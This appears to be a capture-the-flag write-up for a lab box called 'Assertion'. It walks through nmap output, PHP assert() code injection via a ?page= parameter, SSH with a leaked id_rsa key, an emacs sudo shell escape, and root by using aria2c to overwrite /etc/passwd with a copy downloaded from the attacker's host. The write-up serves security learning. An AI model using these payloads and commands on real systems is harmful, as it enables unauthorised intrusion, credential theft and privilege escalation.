# Assertion

## Enumeration&#x20;

### Nmap scan&#x20;

```
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 70:63:06:f4:94:a3:d5:65:2c:3d:33:01:1b:29:b1:1c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTdaOCaRL7KL6lnVROV5t/2oQHMV3sRnTb3Tsa1CxdJeJdjG3Vr1rcRbrX8suaWuB6EYXzmcxHl3brCqoLUAwyUphBnDOIGAF49OoFUGnvnlUzThtbosVMfycD27B3tBQS67KOryn+7xZRMV6WGqkAUslK9f2uMaNz73YvWU3IROTW8Q7xDV0nKxmhu9E0u1EQIqKez8dOf2ULyFYQCF26cWVtaLpT252nb6bzPu83bqgqxbiez62KFTwxDLDKdTI/uN+0JsCIjBrxZb3oMMp9yzXMWUY/XPCd752cs5SdQlBhx3VXnOSeI+V1IS1dqdX5H1a3jlhLM7IMngeAWseV
|   256 39:b4:2d:17:a7:6e:16:e6:24:a0:68:6c:be:15:73:40 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFKhNvMiDsxTmLR1Gc7d9bHmXFh6FAGbEA7TZWFSLZOsA3Mapo5ln+3e5s6GsUg9YVawktEllyR7/33QuV0eytg=
|   256 43:b9:6a:06:0f:fb:a2:7f:ff:f6:fd:ca:1a:8a:70:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEsxbturx1XbPP5mkqPdORTIG0OlkQkGhc+Zr9aaUb97
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Assertion
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 2.6.32 - 3.13 (96%), Linux 4.15 (96%), Linux 5.0 - 5.14 (96%), Linux 5.14 - 6.8 (96%), Linux 3.2 - 4.14 (96%), Linux 4.15 - 5.19 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.10 - 4.11 (95%), Linux 2.6.32 - 3.5 (93%), HP P2000 G3 NAS device (93%)
```

### Port 80 - HTTP

Found a directory called `source` through directory brute forcing, and inside there were a bunch of downloaded theme files. Unzipped them but didn't find anything useful. On the main page though, I noticed a `?page=` parameter, so tried a path traversal attack and got hit with a 'not so easy brother' message, seems like it's sanitizing slashes. Tried the asset function instead and that worked

<figure><img src="../.gitbook/assets/image (650).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (651).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (652).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (653).png" alt=""><figcaption></figcaption></figure>

Old PHP versions let `assert()` run a string as actual code, not just check it. So if a site uses `assert()` somewhere to check your input (like a filename), you can sneak in real PHP code instead of a normal value and it just... runs. That's how I got past the slash filter: the filter was checking a string, but I made it execute code instead.



#### Assert() function&#x20;

```
' and die(highlight_file('/etc/passwd')) or '

or 

' and die(system("id")) or '
```

<figure><img src="../.gitbook/assets/image (654).png" alt=""><figcaption></figcaption></figure>

Found an exposed `id_rsa` private key in `/var/www/html/todolater` someone left it sitting in a web-accessible directory. Pulled real usernames from `/etc/passwd` and tried the key against each one with `ssh -i id_rsa user@target` until it authenticated.

<figure><img src="../.gitbook/assets/image (655).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (656).png" alt=""><figcaption></figcaption></figure>



### Port 22 - SSH&#x20;

Authenticated as user soz with the id\_rsa key

<figure><img src="../.gitbook/assets/image (657).png" alt=""><figcaption></figcaption></figure>

User `soz` had a sudo misconfig allowing `emacs` to run as user `fnx`. Abused Emacs' built-in shell access (`M-x shell` or `M-!`) to break out and get a shell as `fnx`.

```
sudo -u fnx /usr/bin/emacs
```

<figure><img src="../.gitbook/assets/image (658).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (659).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation via aria2c

Since `aria2c` can download and overwrite local files, the plan was to overwrite `/etc/passwd` with a modified copy containing a new root-equivalent user.

Copied the original `/etc/passwd`, appended a new user entry (UID 0) to it, then served the modified file via a local Python HTTP server

```
/usr/bin/aria2c -o passwd "http://vpnip/passwd" --allow-overwrite=true
```

<figure><img src="../.gitbook/assets/image (661).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (662).png" alt=""><figcaption></figcaption></figure>
